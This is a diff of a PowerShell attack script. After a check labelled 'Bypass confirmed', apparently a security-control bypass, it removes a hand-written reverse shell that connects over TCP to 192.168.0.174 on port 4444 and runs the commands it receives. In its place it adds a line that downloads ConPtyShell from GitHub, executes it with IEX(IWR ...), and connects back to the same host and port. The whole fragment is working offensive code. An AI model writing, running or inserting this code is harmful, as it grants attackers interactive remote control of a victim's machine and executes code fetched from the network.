@@ -77,21 +77,9 @@ try {
     if ($fi4 -ne $null) {
         Write-Host '[+] Bypass confirmed'
 
-        # Reverse shell connection
-        $client = New-Object System.Net.Sockets.TcpClient("192.168.0.174", 4444)
-        $stream = $client.GetStream()
-        $writer = New-Object System.IO.StreamWriter($stream)
-        $reader = New-Object System.IO.StreamReader($stream)
-        $writer.AutoFlush = $true
-
-        # Send initial message
-        $writer.WriteLine("Reverse shell connected")
-
-        # Read and send commands
-        while (($command = $reader.ReadLine()) -ne $null) {
-            $output = Invoke-Expression $command
-            $writer.WriteLine($output)
-        }
+        # Download and execute ConPtyShell
+        IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); 
+        Invoke-ConPtyShell 192.168.0.174 4444
     } else {
         Write-Host '[!] Bypass failed'
     }
